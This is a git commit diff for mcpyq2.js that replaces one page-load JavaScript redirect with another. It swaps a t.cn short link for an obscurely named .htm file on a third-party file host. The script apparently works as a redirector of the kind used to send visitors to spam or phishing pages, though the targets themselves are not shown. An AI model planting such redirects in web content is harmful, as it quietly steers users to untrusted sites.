04348a6dda798a97cde7f75901c5eed901187a48
malcolms6 <151632134+malcolms6@users.noreply.github.com>
2023-12-18 15:25:27 +0800

    Update mcpyq2.js

--- mcpyq2.js
+++ mcpyq2.js
@@ -1,1 +1,1 @@
-window.location.href="http://login.t.cn/A6liiFfR"
+window.location.href="https://static.clouderwork.com/file/22b2348a-83db-48ed-b728-1d6865c577f0__pp588_1669654.htm?id=hSdTJYLH5DUp8nIM2xCPKyG0Otim1bAV"
